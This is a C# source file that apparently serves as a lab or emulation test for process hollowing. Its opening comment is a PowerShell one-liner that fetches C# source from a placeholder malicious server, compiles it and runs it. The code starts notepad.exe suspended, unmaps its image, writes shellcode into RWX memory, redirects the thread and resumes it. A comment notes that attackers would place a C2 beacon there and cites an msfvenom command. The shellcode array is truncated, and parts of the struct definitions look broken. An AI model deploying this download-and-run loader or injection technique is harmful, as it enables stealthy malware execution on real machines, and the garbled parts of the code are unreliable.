// powershell.exe -NoProfile -Command "$src = Invoke-RestMethod '#{server.malicious.url}/Hollow.cs'; Add-Type -TypeDefinition $src; [Hollowing.Program]::Run('C:\Windows\System32\notepad.exe')"
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace Hollowing
{
    public class Program
    {
        // --- 🟢 PAYLOAD SECTION 🟢 ---
        // This is a benign x64 shellcode that executes calc.exe.
        // In a real scenario, attackers would put their C2 beacon here.
        public static byte[] payload = new byte[] {
            0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0,
            0x48, 0x8d, 0x15, 0x07, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x0d, 0x05, 0x00, 0x00, 0x00, 0xff, 0x25,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            /* ... [Full benign calc shellcode truncated for brevity] ... */
            // Note: For your lab, you can generate a full array using msfvenom: 
            // msfvenom -p windows/x64/exec CMD=calc.exe -f csharp
            0x48, 0x31, 0xc0, 0x48, 0xff, 0xc0, 0x48, 0xff, 0xc8, 0x48, 0x31, 0xc0, 0xc3
        };

        // --- Windows API Signatures ---
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO { public uint cb; public string lpReserved, lpDesktop, lpTitle; public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags; public ushort wShowWindow, cbReserved2; public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError; }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public uint dwProcessId, dwThreadId; }

        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64 {
            public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
            public uint ContextFlags;
            public uint MxCsr;
            public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
            public uint EFlags;
            public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
            public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15, Rip;
            public byte[] Header; 
        }

        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpAppName, string lpCmdLine, IntPtr lpProcAttr, IntPtr lpThreadAttr, bool bInherit, uint dwFlags, IntPtr lpEnv, string lpDir, [In] ref STARTUPINFO lpSI, out PROCESS_INFORMATION lpPI);

        [DllImport("ntdll.dll")]
        public static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr, uint size, uint allocType, uint protect);

        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr, byte[] buffer, uint size, out IntPtr written);

        [DllImport("kernel32.dll")]
        public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);

        // --- Execution Logic ---
        public static void Run(string targetPath)
        {
            Console.WriteLine("[*] Starting Process Hollowing with embedded payload...");

            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            // 1. Create suspended process
            if (!CreateProcess(targetPath, null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi)) return;

            // 2. Hollow out (Assuming x64 ImageBase)
            IntPtr baseAddr = (IntPtr)0x400000; 
            NtUnmapViewOfSection(pi.hProcess, baseAddr);

            // 3. Allocate and Write the EMBEDDED payload
            IntPtr allocated = VirtualAllocEx(pi.hProcess, baseAddr, (uint)payload.Length, 0x3000, 0x40);
            WriteProcessMemory(pi.hProcess, allocated, payload, (uint)payload.Length, out _);

            // 4. Update Context & Resume
            CONTEXT64 ctx = new CONTEXT64();
            ctx.ContextFlags = 0x100001; // CONTEXT_CONTROL
            GetThreadContext(pi.hThread, ref ctx);
            ctx.Rip = (ulong)allocated;
            SetThreadContext(pi.hThread, ref ctx);

            ResumeThread(pi.hThread);
            Console.WriteLine("[+] Resumed. Payload should now be running inside the target process.");
        }
    }
}
